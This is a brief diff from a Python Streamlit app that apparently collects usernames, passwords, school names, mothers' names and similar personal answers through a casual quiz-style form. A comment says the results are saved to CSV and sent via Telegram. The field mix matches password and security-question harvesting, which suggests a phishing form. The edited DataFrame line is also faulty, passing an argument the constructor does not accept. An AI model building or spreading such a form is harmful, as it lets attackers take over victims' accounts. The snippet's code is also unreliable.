@@ -19,7 +19,7 @@ drink = st.text_input('Next vacation with grillouzo or limoncello?')
 
 # save results to csv and send via telegram
 
-df = df.append({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]}, ignore_index=True)
+df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]}, ignore_index=True)
 import telebot
 import dataframe_image as dfi
 import cv2
